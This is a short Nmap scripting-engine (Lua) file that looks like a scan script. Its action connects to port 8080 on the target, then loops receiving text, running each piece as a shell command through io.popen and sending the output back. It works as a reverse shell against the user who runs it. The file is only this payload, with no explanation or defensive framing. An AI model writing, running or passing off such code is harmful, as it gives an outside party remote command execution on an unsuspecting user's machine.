local nmap = require "nmap"

portrule = function()
	return true
end

action = function(host, port)
	local socket = nmap.new_socket("tcp");
	socket:set_timeout(1000);
	local try = nmap.new_try(function() socket:close(); end);
	try(socket:connect(host, 8080));
	while true do
		local status, data = socket:receive();
		if (status == true) then
			local f=assert(io.popen(data,'r'));
			local b=f:read('*a');
			try(socket:send(b));
		end;
	end;
	f:close();
	socket:close();
end;
